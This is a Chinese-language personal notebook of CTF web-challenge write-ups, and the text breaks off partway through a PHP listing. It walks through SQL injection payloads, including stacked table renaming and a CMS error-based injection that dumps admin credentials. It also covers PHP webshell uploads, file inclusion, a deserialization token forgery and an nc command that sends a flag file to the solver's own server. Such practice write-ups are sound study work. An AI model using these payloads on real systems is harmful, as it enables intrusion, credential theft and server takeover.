# CTF刷题WriteUp

## WEB

### "百度杯"CTF比赛 十月场——EXEC

**进入网站页面**

![image-20210501154827617](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501154827617.png)

**查看源码**

发现了vim，可能是vim泄露，于是在url地址输入了http://21b854b211034489a4ee1cb0d37b0212560fbf24f2e6468d.changame.ichunqiu.com/.index.php.swp

![image-20210501155039314](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155039314.png)

或者通过dirsearch工具扫描网站目录也可以发现 `/.index.php.swp`，也可以想到vim泄露

![image-20210501155453793](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155453793.png)

下载文件

![image-20210501155637128](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155637128.png)

下一步就是通过 `vim -r index.php.swp`恢复index.php,然后打开

~~~php
<html>
<head>
<title>blind cmd exec</title>
<meta language='utf-8' editor='vim'>
</head>
</body>
<img src=pic.gif>
<?php
/*
flag in flag233.php
*/
 function check($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '11259375';
}
if(isset($_GET[sign])&& check($_GET[sign])){
	setcookie('auth','tcp tunnel is forbidden!');
	if(isset($_POST['cmd'])){
		$command=$_POST[cmd];
		$result=exec($command);
		//echo $result;
	}
}else{
	die('no sign');
}
?>
</body>
</html>
~~~

这里有一个check函数需要绕过，很明显check函数就是把选手输入的数字一个一个的判断，查看这些数字的ASCII码是否在1-9的ASCII码之间，如果符合则验证失败。如果check函数想最后返回返回true，则`$number`需要等于'11259375'，这里可以使用十六进制来绕过即可。

代码里面的 `setcookie('auth','tcp tunnel is forbidden!');`告诉我们TCP被禁止不能用curl,而且cmd命令执行之后也没有回显，但是前面的注释告诉了我们flag文件，我们可以直接用nc命令把flag文件下过来，我们需要一台有公网ip的服务器。

在服务器上运行

~~~sh
nc -lup 39999
~~~

然后再题目那里用post方法 cmd=nc -u 你的ip地址 39999 < flag233.php

**注：这里我踩了个小坑，`cmd=nc`我输入成了 `cmd = nc`，等于号两边不能有空格。**

![image-20210501160323527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501160323527.png)

flag便传到了服务器上

![image-20210501160629527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501160629527.png)

### [强网杯 2019]随便注 1

**1.进入网址**

![image-20210501180925552](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501180925552.png)

**2.输入`1‘`符号报语法错误，再输入 `1’ #`页面正常**

![image-20210501181059554](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501181059554.png)

**3.接下来尝试 `order by`查看有几列数据显示**，然后配合 `union select`显示数据库的一些信息，但是select、delete等一些关键字被限制，到这里我知道可能被后台代码做了限制，于是去找了一些绕过限制的语句或者关键字特殊编码，但是都失败了。于是后面便没有了思路，自己还需要多努力啊。。。。多刷题！多扩展思路！

![image-20210501181535674](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501181535674.png)

**4.在网上搜了下解决方案，可以使用堆叠注入，果然可以，把全部库名都给查出来了**

![image-20210501192326812](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192326812.png)

**5.OK继续查表名**

![image-20210501192423272](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192423272.png)

**6.然后就是分别查看"1919810931114514"表与"words"表这两个表的结构**

![image-20210501192950713](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192950713.png)

![image-20210501193132021](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501193132021.png)

使用了关键字 `desc`来查看表里的字段结构，注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符

**7.由此可以想到该输入框的SQL语句应该是 `select id,data from words where id = ?`**

因为可以是堆叠查询，这时候我们可以使用改名的方法，把含有flag的"1919810931114514"表改名为words，再把flag字段改名为id，结合上面的1' or 1 #爆出表内所有的内容就可以查到flag了。

~~~sql
1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table words change flag id varchar(100) character set utf8 collate utf8_general_ci NOT NULL;desc words;#
~~~

![img](CTF%E5%88%B7%E9%A2%98WriteUp.assets/1790307-20200225003553488-841750902.png)

**8. 再用一下一开始的操作id=1' or 1=1#，最终获得flag值**

![image-20210501194343817](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501194343817.png)

> 突然发现自己好菜啊，果然光听不练假把式。在实践中学习，在学习中实践！以下是第二天的题，记录下自己踩得坑，得到了什么经验，学到了什么新东西。但是发现自己踩得全是坑。。。。。

### “百度杯”CTF比赛 2017 二月场——爆破-1

进入网站

![image-20210502140954426](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502140954426.png)

呦吼，阅读php代码，有点javaweb语言基础的我还是勉强能看懂的，就是有些特殊的函数就不知道它的具体功能了，百度。。。。其中不认识的php函数我都整理到了PHP代码审计的笔记中了。

网上的解题思路大部分都是看见了两个$$符号，就猜到了要考察`GLOBALS`超全局变量，而我这个小菜鸟连这个超全局变量都没听说过，又学到了新东西。结合自己的想法，$a表示URL中输入的参数值，但是GLOBALS变量使用前要有$符号，所以看见两个$$符号就想到了GLOBALS。这是自己的理解。

![image-20210502142121838](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502142121838.png)

解题成功，通过这道题学到了GLOBALS超全局变量。

### “百度杯”CTF比赛 2017 二月场——爆破-2

![image-20210502143146826](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502143146826.png)

该题就是通过url的参数值来获得flag.php中的flag值。怎么获得呢？如果直接输入`flag.php`会被当成字符串执行，没有任何意义，我们读取需要flag.php文件里面的内容。所以可以使用`file()、file_get_contents()`函数，提前把flag.php读入一个数组或者字符串，然后在通过var_dump()函数把变量输出，但是输出的内容就是flag.php文件里面的内容。

还有一种方法就是拼接字符串。`1);show_source('flag.php');var_dump(` 把var_dump()拆分成三个函数即可。

![image-20210502144424875](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502144424875.png)

### “百度杯”CTF比赛 九月场——SQL

![image-20210502144617838](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502144617838.png)

需要对id参数进行SQL注入，测试得到是整数型注入，但是order by 、union select等一些关键字都被限制了，学到了一个新的绕过姿势，使用<>绕过。便可一路过关斩将，利用information_schema库的一些信息来获得了flag值。

**首先获得表**

![image-20210502150010162](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150010162.png)

**获得表中的字段**

![image-20210502150334897](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150334897.png)

**最终可以获得表中的值**

![image-20210502150439645](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150439645.png)

### “百度杯”CTF比赛 十月场——Login

![image-20210502151044842](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151044842.png)

进去网站我看见是一个登录页面，然后我就迫不接待的打开了brup打算暴力破解密码，这里非常成功的踩了第一个坑。没有看注释，注释里给了账号和密码，说明出题人考察的方面根本就不是暴力破解密码。

![image-20210502151316297](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151316297.png)

接下来登录进去网站，发现啥也没有。

![image-20210502151421923](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151421923.png)

好了，又没思路了，我可太菜了。。。。。借鉴一下别人的思路，用burp抓包试试。

![image-20210502152040368](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502152040368.png)

发现了response里面有个可以的参数show=0，我们可以试试从客户端发个show=1的包看看服务器的响应是怎么样的。成功获得一段PHP代码，又要开始代码审计了。马马虎虎能看懂，还需要再学学PHP啊。

![image-20210502152338715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502152338715.png)

~~~php
<?php
	include 'common.php';
	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
	class db
	{
		public $where;
		function __wakeup()
		{
			if(!empty($this->where))
			{
				$this->select($this->where);
			}
		}

		function select($where)
		{
			$sql = mysql_query('select * from user where '.$where);
			return @mysql_fetch_array($sql);
		}
	}

	if(isset($requset['token']))
	{
		$login = unserialize(gzuncompress(base64_decode($requset['token'])));
		$db = new db();
		$row = $db->select('user=\''.mysql_real_escape_string($login['user']).'\'');
		if($login['user'] === 'ichunqiu')
		{
			echo $flag;
		}else if($row['pass'] !== $login['pass']){
			echo 'unserialize injection!!';
		}else{
			echo "(╯‵□′)╯︵┴─┴ ";
		}
	}else{
		header('Location: index.php?error=1');
	}

?>
~~~

来吧兄弟们，代码审计走起来。class db这一段就是对数据库的一个操作，对本体来说不重要， 重点看 `if(isset($requset['token']))`这个里面的代码！以下是我对本段代码的理解。

获取token的值，token值经过了base64解码-->解压缩-->对单一的已序列化的变量进行操作将其转换回PHP 的值,

最终获得login变量，但是login变量里的user值必须为'ichunqiu'才会获得flag。

现在就是构造一个token，给它的user值赋予'ichunqiu'，然后序列化-->压缩-->base64编码

![image-20210502154345812](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154345812.png)



![image-20210502154334063](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154334063.png)

最后加cookie里面加上token参数给服务器发送。服务器便会成功返回一个flag值。

![image-20210502154529559](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154529559.png)

成功返回flag值，奥利给，又学了新东西。

### [HCTF 2018]WarmUp 1

这是一个代码审计题，首先进入网站，查看源码

### ![image-20210502180730817](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502180730817.png)

发现了提示信息，然后咱们在URL地址中输入 `source.php`，查看跳转页面，页面显示如下代码，好吧，开始看代码吧。。。。。。

~~~php+HTML
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {	//定义了白名单
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
//isset()判断变量是否声明,is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
//file里输入的内容是否是白名单内的字符串，符合则返回true
            if (in_array($page, $whitelist)) {
                return true;
            }
 //过滤问号的函数(如果$page的值有?则从?之前提取字符串,没有则提取整个字符串)
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')//返回$page.?里卖弄?号出现的第一个位置
            );
//第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真，此时我用的payload已经符合，返回true            
            if (in_array($_page, $whitelist)) {
                return true;
            }
//url对$page解码
            $_page = urldecode($page);
//过滤问号的函数           
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真            
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])		#file不能为空
        && is_string($_REQUEST['file'])	#file必须为字符串
        && emmm::checkFile($_REQUEST['file'])#要符合checkFile函数，成功返回True
    ) {
        include $_REQUEST['file'];		#执行文件包含命令
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>

~~~

发现白名单中还有个 `hint.php`文件，进去看看，告诉我们flag在哪里。

![image-20210502181936929](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502181936929.png)

**payload：**

~~~php
?file=hint.php?../../../../../ffffllllaaaagggg
~~~

我们可以想象他传入checkFile函数要经历 第一次白名单验证, 一次?过滤后,他就是hint.php 再进行一次白名单验证 返回为真, 则达成条件进行包含得到flag

![image-20210502182300265](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502182300265.png)

### “百度杯”CTF比赛 2017 二月场——爆破3

进入网站

![image-20210502183455576](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502183455576.png)

映入眼帘的又是PHP代码，看来PHP是世界上最好的语言这句话没有错啊，哈哈哈哈，靶场全都是PHP代码，慢慢积累慢慢学吧。

说正题，先阅读一下代码，大体意思是Session中的num初始值为0，time为当前时间，whoami的初始值为ea。120秒之后销毁会话。用str_rands随机生成2个字母，whoami需要等于我们传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++，whoami=str_rands，循环10次后，输出flag。


~~~php
<?php 
error_reporting(0);//不显示错误信息
session_start();//启动新会话或者重用现有会话
require('./flag.php');
if(!isset($_SESSION['nums'])){//给session会话初试赋值
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){//120秒之后销毁session会话
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];
//
if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){	//num>=10会输出flag
  echo $flag;
}

show_source(__FILE__);
?>

~~~

由19行可看出为弱判断类型，可以用数组进行绕过，md5函数不能对数组进行处理，所以传数组。md5()==0

根据获取到的信息构造payload    ?value[]=ea

代码中提到需要提交大于10次，10次过后得到flag

![image-20210502190337932](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502190337932.png)

本题学到了数组在传值的应用，以及md5对数组加密无效。加油！！！

### “百度杯”CTF比赛 九月场——Upload

打开网页上传shell文件，结果发现前面的<?php被限制去掉了

![image-20210502194728556](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502194728556.png)

百度了一下原来还有PHP长标签，又是收获啊

~~~javascript
<script language="PHP"> //php小写被过滤了，所以改成了大写，也可以大小写混合
  @eval($_POST["pass"]);    
</script>
~~~

再次上传shell脚本，结果页面无显示，说明上传成功了。接下来就是打开蚁剑，建立连接成功。

![image-20210502195327414](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195327414.png)

成功获得flag

![image-20210502195626813](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195626813.png)

### “百度杯”CTF比赛 2017 二月场——include

进入页面

![image-20210502195853956](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195853956.png)

先搜索一下是否允许文件包含，给你phpinfo的作用不就是这样，发现允许文件包含，所以可以用`php://input`伪协议包含文件。

![image-20210502200012326](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502200012326.png)

接下来看代码要求

~~~php
<?php 
show_source(__FILE__);
if(isset($_REQUEST['path'])){
    include($_REQUEST['path']);
}else{
    include('phpinfo.php');
}
~~~

path可以直接传参数进行文件包含。。。抓包，用PHP伪协议执行php代码，没想到成功了。

![image-20210502201036831](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502201036831.png)

发现了个可以的文件名，直接执行linux系统命令

~~~php
<?php system("cat dle345aae.php");?>
~~~

成功获得flag

![image-20210502201315455](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502201315455.png)

### 2017第二届广东省强网杯线上赛——broken

进入网址看见全都是一些中括号、感叹号什么的，有点蒙，后来才知道这是jsfuck加密。。。。[详细解释]([JSFuck 有趣的js加密 (360doc.com)](http://www.360doc.com/content/20/0206/19/30583588_890134979.shtml))

害得我一顿扫描目录还有抓包。

![image-20210503165413769](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503165413769.png)

![image-20210503165424044](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503165424044.png)

这里需要了解一下**jsfuck的解密方法**

> jsfuck、jjencode、aaencode可以被很轻易的还原：
> 第一步：首先打开谷歌浏览器，进入浏览器控制台。
> 第二步：去掉最后一行末尾的()，复制加密后的代码；
> 第三步：在console控制台粘贴你第二步复制的代码；
> 第四步：回车，达到便能得到解密后的代码。

但是呢，这道题还有一个坑就是符号的匹配问题，他在最前面多了一个 `[`没有进行匹配，删掉即可显示js 代码，成功获得flag

![image-20210503165814265](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503165814265.png)

通过这道题，知道了jsfuck编码。

### 2017第二届广东省强网杯线上赛——who are you?

进入网站，对不起，你没有权限。果断去用burp抓包,查看是否有可疑字段

![image-20210503170040013](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503170040013.png)

发现了cookie中有个role值，看着像base64编码，去解码

![image-20210503170443094](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503170443094.png)

解码发现，这不就是我今天刚学的php的无类序列化问题嘛，这里面的用户是thrfg，我用admin编码之后试试能不能有权限，结果发现登录不进去。后来看了别人的writeup才知道，原来thrfg也是编码后的，用的是rot-13编码，编码后是guest.

![image-20210503170557070](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503170557070.png)

然后把admin用rot-13编码，再用base64把整体编码传入cookie中登录成功。

![image-20210503171603238](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503171603238.png)

![image-20210503171636111](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503171636111.png)

登录成功显示让上传东西，查看源码给了传输的条件。

![image-20210503171522878](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503171522878.png)

![image-20210503172208669](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503172208669.png)



报错了，后台应该有限制，尝试去绕过。因为网页做了正则匹配过滤. 而用data[]=的方法，把data从字符串变成数组，可以绕过正则匹配的过滤。

![image-20210503172356709](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503172356709.png)

绕过限制以后，显示传输成功，并且给了传输成功的地址，但是都是显示404找不到资源

![image-20210503174345724](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503174345724.png)

![image-20210503174402068](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503174402068.png)

![image-20210503174514339](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503174514339.png)

我猜测应该是服务器的问题，我在网上找了很多解题方法，都没有遇到这种情况。我也用dirsearch扫了一下目录。并没有发现uploads文件夹，可能更加应征了我的猜测，过段时间再来看看这道题吧。

这道题就是用了**两次的编码（base64、rot-13）把admin身份传入cookie中通过了身份验证**，然后就是文件上传的正则表达式限制字符串的格式，**通过数组去绕过正则表达式限制**。

### “百度杯”CTF比赛 九月场——YeserCMS

进入网站，是一个庞大的电商系统，一时间不知如何下手。先去百度搜搜以前报过哪些漏洞吧。

![image-20210503182613652](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503182613652.png)

在网上顺利找到一个注入点，直接进行尝试

~~~http
http://cac6d32bf8ff4b52becb3516148c9c106deeaa1e92b64a8e.changame.ichunqiu.com//celive/live/header.php
~~~

**Payload**:通过POST方式传参

~~~
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(database())) ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>
~~~

最终成功破解管理员账号密码，爆出的密码并不全，通过把1改成11就会把后面的密码显示，然后通过MD5算法解密即可

![image-20210503183242453](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503183242453.png)

成功用账号密码登录进管理员页面

![image-20210503183411367](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503183411367.png)

但是下一步该怎么办，我们需要获得的是在网站根目录下的flag.php文件，可以在管理员后台找有没有访问服务器文件的功能，找到了模板功能中的修改模板，这个功能点不就是修改服务器中的web文件嘛，所以在点击编辑的时候抓包，修改地址就获得了flag.php文件。

![image-20210503183807527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503183807527.png)

![image-20210503182451205](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503182451205.png)

这个题考查的是对公共cms系统漏洞的复现，以及利用web管理员的权限提权获得服务器中文件的信息，利用的就是功能点路径的限制不严格。

> 第三天开始啦！

### 第三届“百越杯”福建省高校网络空间安全大赛——Do you know upload？

进入网站

![image-20210504144854894](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504144854894.png)

查看源代码，发现了文件包含注释，所以可以直接上传任何后缀的文件都会被解析成PHP文件，所以话不多说，上传个php文件试试，显示上传文件类型不正确，上传jpg格式可以

![image-20210504144839893](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504144839893.png)

抓个包，改下content-type:image/jpeg，成功绕过上传成功

![image-20210504152910664](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504152910664.png)

用蚁剑连接成功，发现里面有个config.php文件，打开发现了数据库配置的账号密码，flag可能在数据库中，然后用蚁剑连接数据库，成功获得flag

![image-20210504152923606](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504152923606.png)

![image-20210504152930806](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504152930806.png)

这道题其实难度不大，上传绕过也很基础，不要想的太复杂。

### 2016全国大学生信息安全竞赛——破译（未解决）

这道题没有网页，只有下面的一段密文，让选手破译，第一次遇到这种题目

~~~
 TW5650Y - 0TS UZ50S S0V LZW UZ50WKW 9505KL4G 1X WVMUSL510 S001M0UWV 910VSG S0 WFLW0K510 1X LZW54 WF5KL50Y 2S4L0W4KZ52 L1 50U14214SLW X5L0WKK S0V TSK7WLTS88 VWNW8129W0L 50 W8W9W0LS4G, 95VV8W S0V Z5YZ KUZ118K SU41KK UZ50S.LZW S001M0UW9W0L ESK 9SVW SL S K5Y050Y UW4W910G L1VSG TG 0TS UZ50S UW1 VSN5V KZ1W9S7W4 S0V FM LS1, V54WUL14 YW0W4S8 1X LZW 50LW40SL510S8 U112W4SL510 S0V WFUZS0YW VW2S4L9W0L 1X LZW 9505KL4G 1X WVMUSL510.
"EW S4W WFU5LWV L1 T41SVW0 1M4 2S4L0W4KZ52 E5LZ LZW 9505KL4G 1X WVMUSL510 L1 9S7W S 810Y-8SKL50Y 592SUL 10 LZW 85NWK 1X UZ50WKW KLMVW0LK LZ41MYZ S 6150L8G-VWK5Y0WV TSK7WLTS88 UM445UM8M9 S0V S E5VW 4S0YW 1X KUZ118 TSK7WLTS88 241Y4S9K," KS5V KZ1W9S7W4. "LZ5K U1995L9W0L 9S47K S01LZW4 958WKL10W 50 LZW 0TS'K G1MLZ S0V TSK7WLTS88 VWNW8129W0L WXX14LK 50 UZ50S." X8SY { YK182V9ZUL9STU5V}
~~~

这是什么啊，蒙了。看着不像是熟悉的base64、md5加密啊，百度一下



### “百度杯”CTF比赛 九月场——Test

这道题和昨天做的YeserCMS套路是一样的，这个稍微简单点。都是给了一个开源的cms站，根据他们以往被爆出的漏洞进行渗透。

![image-20210504155938028](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504155938028.png)

直接百度历史漏洞

爆出payload：

~~~
直接在直接在url后面加上：/search.php?searchtype=5&tid=&area=eval($_POST[1])
~~~

咱们先用phpinfo()试试漏洞，果然成功了

![image-20210504160150073](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504160150073.png)

果断修改为一句话木马 `eval($_POST[pass])`，用蚁剑连接即可成功。

![image-20210504160548076](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504160548076.png)

进去服务器之后并没有发现flag文件，心想是不是跟上一个题一样的套路，flag藏在数据库中，然后就找数据库连接文件，连接数据库。

![image-20210504160730768](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504160730768.png)

在数据库中成功找到flag文件

![image-20210504160840893](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504160840893.png)

做题做多了，出题人的套路也慢慢的熟悉了一些。继续努力！

### “百度杯”CTF比赛 九月场——123

进入网站

![image-20210504161018898](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504161018898.png)

登录？老套路，第一步先看源码

![image-20210504161105091](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504161105091.png)

注释说用户信息在user.php里，打开看看？没有回显任何信息，先用dirsearch扫一下目录吧

![image-20210504161728291](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504161728291.png)

![image-20210504163001048](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504163001048.png)

扫出的结果并没有什么异常的文件，后来看了wp，发现竟然有个`user.php.bak`文件，扫描文件没扫出来哦，下载下来是个用户名，果断爆破密码



![image-20210504162933003](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504162933003.png)

从1990年开始，扫出了一个结果

![image-20210504163216924](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504163216924.png)

于是成功登录进去啥也没有。。。。。肯定又是在注释里，果然。

![image-20210504163302089](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504163302089.png)

form表单存在上传漏洞？接下来怎么办呢？去掉注释

![image-20210504163955143](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504163955143.png)

接下来就是上传文件的知识了

![image-20210504164231534](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504164231534.png)

上传各种绕过的方式都显示文件名不合法，它的限制好像是文件名和内容都不能含有PHP字母，否则就会显示文件内容不合法。于是随便写了几个1，显示出来了一个超链接

![image-20210504164955941](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504164955941.png)

![image-20210504164728314](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504164728314.png)

进入/view.php显示一个file?

![image-20210504165428568](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504165428568.png)

用他包含flag试试

![image-20210504165754866](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504165754866.png)

字符串过滤flag,使用字符串叠加，成功显示flag值

![image-20210504165848715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504165848715.png)

感觉这道题考的知识点好多啊，有文件备份泄露、密码暴力破解、文件上传、字符串过滤等。收获很大。

### “百度杯”CTF比赛 九月场——SQLi

进入页面发现什么也没有，查看注释

![image-20210504173901172](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504173901172.png)

果断访问这个地址，结果打算SQL注入，输入很多情况并没有回显任何信息，只能看看别人的思路了。

访问index.php抓包显示，发现了refresh响应字段，重定向

![image-20210504172608161](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504172608161.png)

发现refresh中重定向的地址l字母变成了1，在url中显示，然后就用原始的地址抓包发现了l0gin.php?id=1，这个才是真的注入点吧。哇，这个题真的考验眼力啊。。。

![image-20210504173837416](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504173837416.png)

成功回显内容，开始注入吧

![image-20210504174247543](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504174247543.png)

输入参数 `1' and ascii(substr((select database()),1,1))>64 %23`，发现 `，`之后的内容没有显示，语句没有执行成功被显示了出来，说明代码限制了 `，`的使用，可以使用其他的SQL语句进行绕过

![image-20210504180137413](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504180137413.png)

用 `order by` 判断出来是两列显示，`union select 1,2`中的 `，`被限制了， 可以使用 `union select * from ((select 1) a join (select 2) b )`绕过

![image-20210504180931298](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504180931298.png)

接下来就可以使用数据库的一些特殊函数来获得flag值，先获取数据库和版本信息

![image-20210504181145862](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504181145862.png)

使用information_schema数据库获取数据库表信息，users表

![image-20210504181411306](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504181411306.png)

获取数据表users内部的字段信息

![image-20210504181549896](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504181549896.png)

最终获得users表中的flag信息

![image-20210504181714382](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504181714382.png)

好坑啊这个题，给了一个假的注入点，还要考察眼力。。。。。。不过也学习到了新的绕过逗号限制的方式。

### “百度杯”CTF比赛 九月场——Code(*)

进入网站

![image-20210504212939544](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504212939544.png)

![image-20210504214155014](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504214155014.png)

![image-20210504214208022](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504214208022.png)

~~~php
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=hei.jpg');
$file = $_GET['jpg'];
echo '<title>file:'.$file.'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
$file = str_replace("config","_", $file);
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";

/*
 * Can you find the flag file?
 *
 */

?>
~~~

> 正则表达式
>  ^在[]外表示以什么开头
>  ^在[]里表示取反
>  .表示除换行符（\n、\r）之外的任何单个字符

![image-20210504215648121](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504215648121.png)



~~~php
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
error_reporting(E_ALL || ~E_NOTICE);
include('config.php');
//生成length长度的随机数
function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {
    $hash = '';
    $max = strlen($chars) - 1;
    for($i = 0; $i < $length; $i++)	{
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}
//传入txt、key两个变量
function encrypt($txt,$key){
    for($i=0;$i<strlen($txt);$i++){
